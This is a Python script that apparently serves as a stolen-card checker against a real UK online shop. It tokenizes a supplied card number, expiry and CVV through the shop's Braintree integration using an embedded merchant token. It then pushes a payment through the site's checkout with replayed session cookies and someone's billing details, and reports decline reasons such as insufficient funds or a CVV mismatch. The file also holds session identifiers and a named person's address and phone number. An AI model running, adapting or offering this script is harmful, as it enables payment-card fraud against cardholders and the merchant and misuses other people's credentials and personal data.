import requests
import time
def Tele(cx):
	cc = cx.split("|")[0]
	mes = cx.split("|")[1]
	ano = cx.split("|")[2]
	cvv = cx.split("|")[3]
	if "20" in ano:
		ano = ano.split("20")[1]
	headers = {
	    'authority': 'payments.braintree-api.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3Mjg4NTI4NzksImp0aSI6IjAyOTc3OThmLTI2YWQtNDA5ZS1iMTkzLTdhNTAyMDAwYWVjZCIsInN1YiI6ImJxY3h0bjZ4eWZycWJzd3ciLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImJxY3h0bjZ4eWZycWJzd3ciLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.-JMgiKznbibZ_SwlfJ3QD_k4zMMzfb8jqqgicUUmh-_-Wxsh2DcENDvz42-wLbll22aLYwf9z39xOWmOPX0_Hg',
	    'braintree-version': '2018-05-10',
	    'content-type': 'application/json',
	    'origin': 'https://assets.braintreegateway.com',
	    'referer': 'https://assets.braintreegateway.com/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'custom',
	        'sessionId': 'e4cafb6e-efe7-433c-acb1-546b3c615523',
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': cc,
	                'expirationMonth': mes,
	                'expirationYear': ano,
	                'cvv': cvv,
	            },
	            'options': {
	                'validate': False,
	            },
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	
	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

	token=response.json()['data']['tokenizeCreditCard']['token']

	headers = {
	    'authority': 'api.braintreegateway.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'content-type': 'application/json',
	    'origin': 'https://www.cytoplan.co.uk',
	    'referer': 'https://www.cytoplan.co.uk/checkout/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	json_data = {
	    'amount': '11.00',
	    'additionalInfo': {
	        'billingLine1': 'Royal London Park',
	        'billingLine2': 'Waterton Industrial Estate',
	        'billingCity': 'Bridgend',
	        'billingPostalCode': 'CF31 3TN',
	        'billingCountryCode': 'GB',
	        'billingPhoneNumber': '+445167778936',
	        'billingGivenName': '\\u006d\\u006f\\u0068\\u0061\\u006d\\u0065\\u0064',
	        'billingSurname': '\\u0048\\u0061\\u006d\\u0073\\u0079',
	    },
	    'challengeRequested': True,
	    'bin': '424242',
	    'dfReferenceId': '1_1188b5e9-a0f6-4410-acef-e6d4d43dd2c9',
	    'clientMetadata': {
	        'requestedThreeDSecureVersion': '2',
	        'sdkVersion': 'web/3.94.0',
	        'cardinalDeviceDataCollectionTimeElapsed': 7,
	        'issuerDeviceDataCollectionTimeElapsed': 2721,
	        'issuerDeviceDataCollectionResult': True,
	    },
	    'authorizationFingerprint': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3Mjg4NTI4NzksImp0aSI6IjAyOTc3OThmLTI2YWQtNDA5ZS1iMTkzLTdhNTAyMDAwYWVjZCIsInN1YiI6ImJxY3h0bjZ4eWZycWJzd3ciLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImJxY3h0bjZ4eWZycWJzd3ciLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.-JMgiKznbibZ_SwlfJ3QD_k4zMMzfb8jqqgicUUmh-_-Wxsh2DcENDvz42-wLbll22aLYwf9z39xOWmOPX0_Hg',
	    'braintreeLibraryVersion': 'braintree/web/3.94.0',
	    '_meta': {
	        'merchantAppId': 'www.cytoplan.co.uk',
	        'platform': 'web',
	        'sdkVersion': '3.94.0',
	        'source': 'client',
	        'integration': 'custom',
	        'integrationType': 'custom',
	        'sessionId': 'e4cafb6e-efe7-433c-acb1-546b3c615523',
	    },
	}
	
	response4 = requests.post(
	    f'https://api.braintreegateway.com/merchants/bqcxtn6xyfrqbsww/client_api/v1/payment_methods/{token}/three_d_secure/lookup',
	    headers=headers,
	    json=json_data,
	)

	nonce = response4.json()['paymentMethod']['nonce']

	cookies = {
	    'mage-cache-storage': '{}',
	    'mage-cache-storage-section-invalidation': '{}',
	    '_clck': 'p967pl%7C2%7Cfpy%7C0%7C1746',
	    '__adroll_fpc': '13a19376a504e9156dd91b0e69385b04-1728728244253',
	    '_fbp': 'fb.2.1728728244600.396984249207616381',
	    'form_key': 'dcWpJyCQyHusjHIJ',
	    'mage-banners-cache-storage': '{}',
	    'recordID': '886df073-d0b8-4e6f-9777-8d5ed2efaaf1',
	    'amcookie_policy_restriction': 'denied',
	    'recently_viewed_product': '{}',
	    'recently_viewed_product_previous': '{}',
	    'recently_compared_product': '{}',
	    'recently_compared_product_previous': '{}',
	    'product_data_storage': '{}',
	    'cookiefirst-consent': '%7B%22necessary%22%3Atrue%2C%22performance%22%3Atrue%2C%22functional%22%3Atrue%2C%22advertising%22%3Atrue%2C%22timestamp%22%3A1728728251%2C%22type%22%3A%22category%22%2C%22version%22%3A%226194f0e0-bd50-4925-a389-f80ee4a5d4b4%22%7D',
	    '_gcl_au': '1.1.1760181624.1728728251',
	    '_ga': 'GA1.1.41770599.1728728244',
	    'smc_tag': 'eyJpZCI6NjY2OCwibmFtZSI6ImN5dG9wbGFuLmNvLnVrIn0%3D',
	    'smc_tpv': '1',
	    'smc_sesn': '1',
	    'smc_not': 'default',
	    'smct_last_ov': '%5B%7B%22id%22%3A133637%2C%22loaded%22%3A1728767624835%2C%22open%22%3Anull%2C%22eng%22%3Anull%2C%22closed%22%3Anull%7D%5D',
	    'smc_uid': '1728296059420584',
	    'dataservices_customer_id': '%22321511%22',
	    'dataservices_customer_group': '%7B%22customerGroupCode%22%3A%22356a192b7913b04c54574d18c28d46e6395428ab%22%7D',
	    'dataservices_cart_id': '%222587067%22',
	    'form_key': 'dcWpJyCQyHusjHIJ',
	    'X-Magento-Vary': 'd4781023cb8914348034d11241de98ca665efda8faf6977f71120c4c0b70053c',
	    'mage-cache-sessid': 'true',
	    'authentication_flag': 'false',
	    'PHPSESSID': 'ab1n2s0i12rpb1ogrk6ji7vs6f',
	    'slidingcart_show_cart': '1',
	    'dataservices_product_context': 'eyJwcm9kdWN0SWQiOjQ5MywibmFtZSI6IlZlZ2V0YXJpYW4gVml0YW1pbiBEMyA2Mi41XHUwMGI1ZyIsInNrdSI6IjMzNTQiLCJ0b3BMZXZlbFNrdSI6IjMzNTQiLCJzcGVjaWFsRnJvbURhdGUiOm51bGwsInNwZWNpYWxUb0RhdGUiOm51bGwsIm5ld0Zyb21EYXRlIjpudWxsLCJuZXdUb0RhdGUiOm51bGwsImNyZWF0ZWRBdCI6IjIwMjAtMDgtMTggMTA6MDc6MDUiLCJ1cGRhdGVkQXQiOiIyMDI0LTA5LTAyIDA3OjA2OjM5IiwiY2F0ZWdvcmllcyI6WyIxMzAiLCIxNjQiLCIxMzMiXSwicHJvZHVjdFR5cGUiOiJzaW1wbGUiLCJwcmljaW5nIjp7InJlZ3VsYXJQcmljZSI6Ni41LCJtaW5pbWFsUHJpY2UiOm51bGwsInNwZWNpYWxQcmljZSI6bnVsbH0sImNhbm9uaWNhbFVybCI6Imh0dHBzOlwvXC93d3cuY3l0b3BsYW4uY28udWtcL3ZlZ2V0YXJpYW4tdml0YW1pbi1kMy02Mi01dWciLCJtYWluSW1hZ2VVcmwiOiJodHRwczpcL1wvd3d3LmN5dG9wbGFuLmNvLnVrXC9tZWRpYVwvY2F0YWxvZ1wvcHJvZHVjdFwvM1wvM1wvMzM1NF92ZWdldGFyaWFuLXZpdGFtaW4tZDNfbWFpbl8xLmpwZyJ9',
	    'mage-messages': '',
	    'aw_popup_viewed_page': '%5B%229a4aedf0b3ce65c89cb6b76a8f5683bdefcdb2f3fb23521915f156d26ec731f8%22%2C%224303a00ddc4dbfc4feae575c5c78a5075decb4fa8c33d02326db1e146cb08d3b%22%2C%22def8467b758b333cf0c51eb60c630dc1cb445c7eb8a92c5b9983a8d637e19e67%22%5D',
	    'amzn-checkout-session': '{}',
	    'dmSessionID': 'e809202a-c8de-4b42-ae6a-7a02b1d73fc2',
	    '__ar_v4': 'YCEMYUSQ5JBDNGM5KOI47O%3A20241011%3A16%7CYGASMLKD7VFZDMIEXQATCK%3A20241011%3A16',
	    '_uetsid': '2c560830888311efb284018250651ecf',
	    '_uetvid': '2c571cd0888311efb2755fedcd1711af',
	    '_clsk': '1vasmik%7C1728770037077%7C1%7C1%7Cj.clarity.ms%2Fcollect',
	    'requestId': '05f0b3d3-2d1c-452b-a9db-1f0fc7a29c7f',
	    'private_content_version': '11805e77061402889694d9ab36cafdc7',
	    '_ga_Z5ZXZNWPF9': 'GS1.1.1728767612.2.1.1728770077.60.0.0',
	    'section_data_ids': '{%22customer%22:1728764420%2C%22compare-products%22:1728764420%2C%22last-ordered-items%22:1728766521%2C%22cart%22:1728766521%2C%22directory-data%22:1728764420%2C%22captcha%22:1728766521%2C%22wishlist%22:1728764420%2C%22loggedAsCustomer%22:1728764420%2C%22multiplewishlist%22:1728764420%2C%22persistent%22:1728766485%2C%22review%22:1728764420%2C%22ammessages%22:1728766521%2C%22apptrian_metapixelapi_matching_section%22:1728766521%2C%22webforms%22:1728764420%2C%22recently_viewed_product%22:1728764420%2C%22recently_compared_product%22:1728764420%2C%22product_data_storage%22:1728764420%2C%22paypal-billing-agreement%22:1728764420%2C%22magepal-gtm-jsdatalayer%22:1728766521%2C%22magepal-eegtm-jsdatalayer%22:1728764420}',
	}
	
	headers = {
	    'authority': 'www.cytoplan.co.uk',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'content-type': 'application/json',
	    # 'cookie': 'mage-cache-storage={}; mage-cache-storage-section-invalidation={}; _clck=p967pl%7C2%7Cfpy%7C0%7C1746; __adroll_fpc=13a19376a504e9156dd91b0e69385b04-1728728244253; _fbp=fb.2.1728728244600.396984249207616381; form_key=dcWpJyCQyHusjHIJ; mage-banners-cache-storage={}; recordID=886df073-d0b8-4e6f-9777-8d5ed2efaaf1; amcookie_policy_restriction=denied; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; cookiefirst-consent=%7B%22necessary%22%3Atrue%2C%22performance%22%3Atrue%2C%22functional%22%3Atrue%2C%22advertising%22%3Atrue%2C%22timestamp%22%3A1728728251%2C%22type%22%3A%22category%22%2C%22version%22%3A%226194f0e0-bd50-4925-a389-f80ee4a5d4b4%22%7D; _gcl_au=1.1.1760181624.1728728251; _ga=GA1.1.41770599.1728728244; smc_tag=eyJpZCI6NjY2OCwibmFtZSI6ImN5dG9wbGFuLmNvLnVrIn0%3D; smc_tpv=1; smc_sesn=1; smc_not=default; smct_last_ov=%5B%7B%22id%22%3A133637%2C%22loaded%22%3A1728767624835%2C%22open%22%3Anull%2C%22eng%22%3Anull%2C%22closed%22%3Anull%7D%5D; smc_uid=1728296059420584; dataservices_customer_id=%22321511%22; dataservices_customer_group=%7B%22customerGroupCode%22%3A%22356a192b7913b04c54574d18c28d46e6395428ab%22%7D; dataservices_cart_id=%222587067%22; form_key=dcWpJyCQyHusjHIJ; X-Magento-Vary=d4781023cb8914348034d11241de98ca665efda8faf6977f71120c4c0b70053c; mage-cache-sessid=true; authentication_flag=false; PHPSESSID=ab1n2s0i12rpb1ogrk6ji7vs6f; slidingcart_show_cart=1; dataservices_product_context=eyJwcm9kdWN0SWQiOjQ5MywibmFtZSI6IlZlZ2V0YXJpYW4gVml0YW1pbiBEMyA2Mi41XHUwMGI1ZyIsInNrdSI6IjMzNTQiLCJ0b3BMZXZlbFNrdSI6IjMzNTQiLCJzcGVjaWFsRnJvbURhdGUiOm51bGwsInNwZWNpYWxUb0RhdGUiOm51bGwsIm5ld0Zyb21EYXRlIjpudWxsLCJuZXdUb0RhdGUiOm51bGwsImNyZWF0ZWRBdCI6IjIwMjAtMDgtMTggMTA6MDc6MDUiLCJ1cGRhdGVkQXQiOiIyMDI0LTA5LTAyIDA3OjA2OjM5IiwiY2F0ZWdvcmllcyI6WyIxMzAiLCIxNjQiLCIxMzMiXSwicHJvZHVjdFR5cGUiOiJzaW1wbGUiLCJwcmljaW5nIjp7InJlZ3VsYXJQcmljZSI6Ni41LCJtaW5pbWFsUHJpY2UiOm51bGwsInNwZWNpYWxQcmljZSI6bnVsbH0sImNhbm9uaWNhbFVybCI6Imh0dHBzOlwvXC93d3cuY3l0b3BsYW4uY28udWtcL3ZlZ2V0YXJpYW4tdml0YW1pbi1kMy02Mi01dWciLCJtYWluSW1hZ2VVcmwiOiJodHRwczpcL1wvd3d3LmN5dG9wbGFuLmNvLnVrXC9tZWRpYVwvY2F0YWxvZ1wvcHJvZHVjdFwvM1wvM1wvMzM1NF92ZWdldGFyaWFuLXZpdGFtaW4tZDNfbWFpbl8xLmpwZyJ9; mage-messages=; aw_popup_viewed_page=%5B%229a4aedf0b3ce65c89cb6b76a8f5683bdefcdb2f3fb23521915f156d26ec731f8%22%2C%224303a00ddc4dbfc4feae575c5c78a5075decb4fa8c33d02326db1e146cb08d3b%22%2C%22def8467b758b333cf0c51eb60c630dc1cb445c7eb8a92c5b9983a8d637e19e67%22%5D; amzn-checkout-session={}; dmSessionID=e809202a-c8de-4b42-ae6a-7a02b1d73fc2; __ar_v4=YCEMYUSQ5JBDNGM5KOI47O%3A20241011%3A16%7CYGASMLKD7VFZDMIEXQATCK%3A20241011%3A16; _uetsid=2c560830888311efb284018250651ecf; _uetvid=2c571cd0888311efb2755fedcd1711af; _clsk=1vasmik%7C1728770037077%7C1%7C1%7Cj.clarity.ms%2Fcollect; requestId=05f0b3d3-2d1c-452b-a9db-1f0fc7a29c7f; private_content_version=11805e77061402889694d9ab36cafdc7; _ga_Z5ZXZNWPF9=GS1.1.1728767612.2.1.1728770077.60.0.0; section_data_ids={%22customer%22:1728764420%2C%22compare-products%22:1728764420%2C%22last-ordered-items%22:1728766521%2C%22cart%22:1728766521%2C%22directory-data%22:1728764420%2C%22captcha%22:1728766521%2C%22wishlist%22:1728764420%2C%22loggedAsCustomer%22:1728764420%2C%22multiplewishlist%22:1728764420%2C%22persistent%22:1728766485%2C%22review%22:1728764420%2C%22ammessages%22:1728766521%2C%22apptrian_metapixelapi_matching_section%22:1728766521%2C%22webforms%22:1728764420%2C%22recently_viewed_product%22:1728764420%2C%22recently_compared_product%22:1728764420%2C%22product_data_storage%22:1728764420%2C%22paypal-billing-agreement%22:1728764420%2C%22magepal-gtm-jsdatalayer%22:1728766521%2C%22magepal-eegtm-jsdatalayer%22:1728764420}',
	    'origin': 'https://www.cytoplan.co.uk',
	    'referer': 'https://www.cytoplan.co.uk/checkout/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	json_data = {
	    'cartId': '2587067',
	    'billingAddress': {
	        'countryId': 'GB',
	        'region': 'Mid Glamorgan',
	        'street': [
	            'Royal London Park',
	            'Waterton Industrial Estate',
	        ],
	        'company': 'Starbucks',
	        'telephone': '+445167778936',
	        'postcode': 'CF31 3TN',
	        'city': 'Bridgend',
	        'firstname': 'mohamed',
	        'lastname': 'Hamsy',
	        'saveInAddressBook': None,
	    },
	    'paymentMethod': {
	        'method': 'braintree',
	        'additional_data': {
	            'payment_method_nonce': nonce,
	            'device_data': '{"correlation_id":"6f6cb578f89974d9e079834b29ec8823"}',
	            'is_active_payment_token_enabler': False,
	            'amgdpr_agreement': '{}',
	        },
	    },
	}
	
	req0 = requests.post(
	    'https://www.cytoplan.co.uk/rest/default/V1/carts/mine/payment-information',
	    cookies=cookies,
	    headers=headers,
	    json=json_data,
	)
	if "three_d_secure" in req0.text:
		return "three_d_secure"
	if "Declined - Call Issuer" in req0.text:
		return "Declined - Call Issuer"
	if "Insufficient Funds" in req0.text:
		return "Insufficient Funds"
	if "Cannot Authorize at this time (Policy)" in req0.text:
		return "Cannot Authorize at this time (Policy)"
	if "Expired Card" in req0.text:
		return "Expired Card"
	if "Cardholder's Activity Limit Exceeded" in req0.text:
		return "Cardholder's Activity Limit Exceeded"
	if "Closed Card" in req0.text:
		return "Closed Card"
	if "Card Not Activated" in req0.text:
		return "Card Not Activated"
	if "risk" in req0.text:
		return "RISK: Retry this BIN later."
	if "Processor Declined - Fraud Suspected" in req0.text:
		return "Processor Declined - Fraud Suspected"
	if "No Account" in req0.text:
		return "No Account"
	if "Card Issuer Declined CVV" in req0.text:
		return "Card Issuer Declined CVV"
	if "Do Not Honor" in req0.text:
		return "Do Not Honor"
	if "Processor Declined" in req0.text:
		return "Processor Declined"
	if "Cannot Authorize at this time (Life cycle)" in req0.text:
		return "Cannot Authorize at this time (Life cycle)"
	if "Limit Exceeded" in req0.text:
		return "Limit Exceeded"
	if "Call Issuer. Pick Up Card" in req0.text:
		return "Call Issuer. Pick Up Card"
	else:
		try:
			code = req0.json()['error']
			return code
		except:
			try:
				return req0.json()['error']
			except:
				return req0.text
